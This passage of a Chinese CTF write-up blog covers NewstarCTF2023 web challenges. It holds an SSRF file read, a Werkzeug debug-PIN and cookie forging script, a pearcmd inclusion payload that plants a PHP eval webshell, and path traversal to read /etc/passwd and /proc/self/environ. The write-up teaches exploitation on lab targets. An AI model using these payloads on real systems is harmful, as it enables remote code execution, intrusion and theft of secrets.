class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;lolita&#x27;</span>]);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);   </span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$x</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$x</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> <span class="title function_ invoke__">curl_setopt</span>(): The CURLOPT_HTTPHEADER option must have an <span class="keyword">array</span> value</span><br></pre></td></tr></table></figure>
+
+<p>先打一下hint，判断传入的<code>hint</code>等于一个数组，直接用<code>hint[]</code>传参就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ad9e0451-31fe-4654-85e8-c9fcba3c34d8.node4.buuoj.cn:81/?hint[0]=your?&amp;hint[1]=mine!&amp;hint[2]=hint!!</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">total 12</span><br><span class="line">drwxr-xr-x    1 root root  51 Nov 29 10:45 .</span><br><span class="line">drwxr-xr-x    1 root root  51 Nov 29 10:45 ..</span><br><span class="line">-rwxr-xr-x    1 root root   0 Nov 29 10:45 .dockerenv</span><br><span class="line">-rwxr-xr-x    1 root root 353 Oct 19 15:52 app.py</span><br><span class="line">lrwxrwxrwx    1 root root   7 Nov 22  2021 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov  8  2021 boot</span><br><span class="line">drwxr-xr-x    5 root root 360 Nov 29 10:45 dev</span><br><span class="line">drwxr-xr-x    1 root root  66 Nov 29 10:45 etc</span><br><span class="line">-rw-------    1 root root  43 Nov 29 10:45 flag</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov  8  2021 home</span><br><span class="line">lrwxrwxrwx    1 root root   7 Nov 22  2021 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx    1 root root   9 Nov 22  2021 lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx    1 root root   9 Nov 22  2021 lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx    1 root root  10 Nov 22  2021 libx32 -&gt; usr/libx32</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov 22  2021 media</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov 22  2021 mnt</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov 22  2021 opt</span><br><span class="line">dr-xr-xr-x 3994 root root   0 Nov 29 10:45 proc</span><br><span class="line">drwx------    1 root root  20 Oct 19 15:52 root</span><br><span class="line">drwxr-xr-x    1 root root  21 Oct 19 15:50 run</span><br><span class="line">lrwxrwxrwx    1 root root   8 Nov 22  2021 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x    2 root root   6 Nov 22  2021 srv</span><br><span class="line">-rwx------    1 root root 241 Oct 19 15:52 start.sh</span><br><span class="line">dr-xr-xr-x   13 root root   0 Sep 19 01:23 sys</span><br><span class="line">drwxrwxrwt    1 root root   6 Nov 29 10:45 tmp</span><br><span class="line">drwxr-xr-x    1 root root  19 Nov 22  2021 usr</span><br><span class="line">drwxr-xr-x    1 root root  17 Oct 19 15:49 var</span><br></pre></td></tr></table></figure>
+
+<p>看一下<code>curl_init,curl_setopt,curl_close</code>，新东西查点资料，好像是<code>curl</code>能够爬取其他站点的内容（</p>
+<p>那这就有点鸡肋了啊，总不至于让你请求钓鱼网站然后中病毒木马什么的吧</p>
+<p>查了一下，可以用<code>file://</code>伪协议读，那就挺好，一看权限，好读的也就<code>app.py</code>了</p>
+<p>但是得注意一下<code>curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST[&#39;lolita&#39;])</code>，传入的要是一个数组</p>
+<p>所以又用<code>lolita[]</code>小绕一下先，先读到再说…</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os, base64</span><br><span class="line"><span class="comment">#from NeepuF1Le import neepu_files</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;islogin&quot;</span>] == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;***********************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1314</span>, debug=<span class="literal">True</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>有个提示<code>#from NeepuF1Le import neepu_files</code>，就搜了一下，结果搜到出题人打NeepuCTF的题解了</p>
+<p>感觉就是根据NeepuCTF的Cute Cirno改编的，有异曲同工之妙，但是就算SSRF了1314端口也拿不到真的flag（</p>
+<p>所以应该是要算pin码了，趁着这个时机好好学一下算pin码</p>
+<blockquote>
+<ul>
+<li><ol>
+<li>username，用户名(&#x2F;etc&#x2F;passwd里面找（（太草了)</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>modname，默认值为flask.app</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>appname，默认值为Flask</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>moddir，flask库下app.py的绝对路径（报错好搞</li>
+</ol>
+</li>
+<li><ol start="5">
+<li>uuidnode，当前网络的mac地址的十进制数（&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address）</li>
+</ol>
+</li>
+<li><ol start="6">
+<li><p>machine_id，docker机器id（如果是docker靶机的话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/machine-id`或者`/proc/sys/kernel/random/boot_id`其中一个拼接上`/proc/self/cgroup</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line"></span><br><span class="line">/usr/local/lib/python3.10/dist-packages/flask/app.py</span><br><span class="line"></span><br><span class="line">/sys/class/net/eth0/address</span><br><span class="line">ea:77:05:58:af:2f-&gt;ea770558af2f-&gt;257796911705903</span><br><span class="line"></span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line">8cab9c97-85be-4fb4-9d17-29335d7b2b8a</span><br><span class="line"></span><br><span class="line">/proc/self/cgroup</span><br><span class="line">aaf831f68f4d63d20b2aa0cf361710787006861f59aff5c33aa21641dde24948</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">li0Abbstc8jO5ov16OhS</span><br></pre></td></tr></table></figure>
+
+<p>照着脚本倒是可以算了，但是因为是<code>php的curl</code>，所以只能用爬取数据，但是无论如何先用POST试一下把</p>
+<p>POST也不行，我的username试了root和www-data来着，总不可能是username的问题把，感觉就是没法访问的问题（（</p>
+<p>瞪不出来，遂看题解，题解也当谜语人，有点绷不住，于是参考了<code>z1d10t</code>的题解</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://z1d10t.fun/post/dcc8a51b.html#WEEK5">https://z1d10t.fun/post/dcc8a51b.html#WEEK5</a></p>
+</blockquote>
+<p>原来是<code>/proc/self/cgroup</code>获取的内容和往常算pin码的题不一样，受教了，正确解如下</p>
+<p><strong><code>取第一行的最后一个斜杠/后面的所有字符串</code>那么肯定是对的</strong></p>
+<p>然后由于console不出网，所以没法通过浏览器直接进入控制台，这个时候需要手算cookie，具体参考如下</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://unk.icu/2023/06/19/flask-pin/">https://unk.icu/2023/06/19/flask-pin/</a></p>
+</blockquote>
+<p>无法直接进入控制台的情况下，对于发送验证pin码的请求有格式上的要求，最重要的就是s，然而这个是可以直接读的，好像还有个frm参数，但是好像是无所谓的（（（如果需要直接访问报错页面在html源码里就能找到</p>
+<p>格式大概如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?__debugger__=yes&amp;cmd=pinauth&amp;pin=xxx-xxx-xxx&amp;s=prj74Iraob1k5eMHiH37</span><br></pre></td></tr></table></figure>
+
+<p>若auth成功，还会带一个cookie：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: __wzdaba192b254d6aa653a27=1687143761|fd1c004c3dc3; HttpOnly; Path=/; SameSite=Strict</span><br></pre></td></tr></table></figure>
+
+<p>之后执行命令的请求，要带上面发过来的cookie，否则不执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?&amp;__debugger__=yes&amp;cmd=print(1)&amp;frm=140324285712640&amp;s=prj74Iraob1k5eMHiH37</span><br><span class="line">Cookie: __wzdaba192b254d6aa653a27</span><br></pre></td></tr></table></figure>
+
+<p>手算cookie的话，直接见全脚本吧（z1d10t佬的题解还可以用gopher发包读到set的cookie值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27;</span>  <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;16476878681546&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment"># machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="comment">#hash_pin作为手算cookie的一部分</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>: <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"><span class="comment">#手算cookie的第二部分</span></span><br><span class="line"><span class="built_in">print</span>(cookie_name + <span class="string">&quot;=&quot;</span> + <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>用Postman发包好使（（（复现成功了，注意传参不能有空格，也不是%20，而是%2B&#x3D;’+’（加号-0_0-</p>
+<p>————————————————————————————————————————————————————————————</p>
+<h3 id="4-复盘"><a href="#4-复盘" class="headerlink" title="4-复盘"></a>4-复盘</h3><p>文件一多我就寄，慌了神，其实这是一道很简单的联想题，但是我又被迷惑了双眼，审代码审的昏天黑地也没把握到本质，最后只能玉玉</p>
+<p>玉玉之后就只能看题解，结果只是简单的文件包含，要调用<code>pearcmd</code>的话并不一定是<code>include</code>，像<code>file_exist</code>这样的也是同理的</p>
+<p>就是要想到有装pearcmd这个插件有点难度，而且还是一句老话，用burp传（（，直接在地址栏传也直接寄</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;page=/../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/var/www/html/1.php</span><br></pre></td></tr></table></figure>
+
+<p>多套几层<code>../</code>，套多了不会怎么样，套少了就读不到了（（（，然后蚁剑连接SUID提权，比赛结束后靠经典命令就读不到了，原因未知</p>
+<p>然后就是<code>gzip</code>提权，博客也就不引了，可以自己搜索一下</p>
+<p>————————————————————————————————————————————————————————————</p>
+<h3 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h3><p>一道神秘题，主要看你有没有好奇心，我的好奇心自然是早就被磨灭了（，看到文件也不下载，只想着摆烂看题解了</p>
+<p>（也有可能是最后一题的因素在把，想赶紧干完去搞别的了┭┮﹏┭┮</p>
+<p>总之就是先随便注册一个账号，下载共享区里的<code>test.res.http</code>，然后呢你可以试着自己上传一个文件，发现它分两次请求，第一次只需要一个hash值和一个文件名就能完成，第二次才是真正的传输文件数据，然后就是考眼力的时候</p>
+<p>在<code>test.res.http</code>里面有一个请求没发送出去，（坑，名字叫做<code>test.req.http</code>，所以有理由推断我们可以伪造发送这个请求，然后就能直接拿到这个文件的数据（此点可以随便试着伪造一个共享区的文件上传，发现不需要第二次传输</p>
+<p>拿到数据之后是<code>admin</code>的用户凭据，直接修改uid和token就能admin上号了，上号之后可以观察本地资源，可疑的就是<code>share.js</code></p>
+<p>一通审之后，发现有些函数调用的是<code>hash_fn</code>，有些调用的则是<code>hash</code>，而且<code>path.resolve</code>会强行忽略不重要的path路径名使之尽可能有效，那么我们就有理由实现一个目录穿越了，因为<code>hash是hash_fn的前64位</code>所以说64位以后的我们就能伪造成我们想要的路径了</p>
+<p>可以测试一下<code>../../../../etc/passwd</code>或者也可以直接<code>../../../../../proc/self/environ</code>，记住得用linux的curl来发包，</p>
+<p>windows的curl应该是不行的，bp没试过（有兴趣的可以尝试一下</p>
+<p>然后读环境变量的话要加<code>--out filename</code>参数把读到的二进制文件保存在一个指定的文件里</p>
+<p>————————————————————————————————————————————————————————————</p>
+<p>至此我的NewstarCTF2023的征程算是告一段落了，有学到很多东西，我要是能牢牢记住的话应该会很不错，后三周题目质量对于我这样的初学者来说真的挺好的，感谢各位出题师傅，也感谢没有放弃的我自己<code>^_^</code></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">John Doe</a>
+            <p>Link：<a href="http://example.com/2023/12/04/NewstarCTF2023/">http://example.com/2023/12/04/NewstarCTF2023/</a>
+            <p>Publish date：<a href="http://example.com/2023/12/04/NewstarCTF2023/">December 4th 2023, 9:00:00 pm</a>
+            <p>Update date：<a href="http://example.com/2023/12/04/NewstarCTF2023/">December 4th 2023, 9:13:26 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/11/18/XDSEC-HW-1/" title="XDSEC-HW-1">
+                    <div class="prevTitle">XDSEC-HW-1</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2670007180@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Jednersaous1" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewstarCTF2023"><span class="toc-number">1.</span> <span class="toc-text">NewstarCTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-week3"><span class="toc-number">1.1.</span> <span class="toc-text">WEB-week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include-pear"><span class="toc-number">1.1.1.</span> <span class="toc-text">include pear</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium-sql"><span class="toc-number">1.1.2.</span> <span class="toc-text">medium_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.3.</span> <span class="toc-text">R!!!C!!!E!!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-week4"><span class="toc-number">1.2.</span> <span class="toc-text">WEB-week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#More-Fast"><span class="toc-number">1.2.1.</span> <span class="toc-text">More Fast</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#midsql"><span class="toc-number">1.2.2.</span> <span class="toc-text">midsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Injectme"><span class="toc-number">1.2.3.</span> <span class="toc-text">Injectme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PharOne"><span class="toc-number">1.2.4.</span> <span class="toc-text">PharOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OtenkiBoy"><span class="toc-number">1.2.5.</span> <span class="toc-text">OtenkiBoy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-week5"><span class="toc-number">1.3.</span> <span class="toc-text">WEB-week5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialize-Again"><span class="toc-number">1.3.1.</span> <span class="toc-text">Unserialize Again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final"><span class="toc-number">1.3.2.</span> <span class="toc-text">Final</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ye%E2%80%99s-Pickle"><span class="toc-number">1.3.3.</span> <span class="toc-text">Ye’s Pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pppython"><span class="toc-number">1.3.4.</span> <span class="toc-text">pppython?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A4%8D%E7%9B%98"><span class="toc-number">1.3.5.</span> <span class="toc-text">4-复盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NextDrive"><span class="toc-number">1.3.6.</span> <span class="toc-text">NextDrive</span></a></li></ol></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 3
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span>
+            <a class="archive-post-title" href="/2023/12/04/NewstarCTF2023/">NewstarCTF2023</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span>
+            <a class="archive-post-title" href="/2023/11/18/XDSEC-HW-1/">XDSEC-HW-1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span>
+            <a class="archive-post-title" href="/2023/11/11/hello-world/">Hello World</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
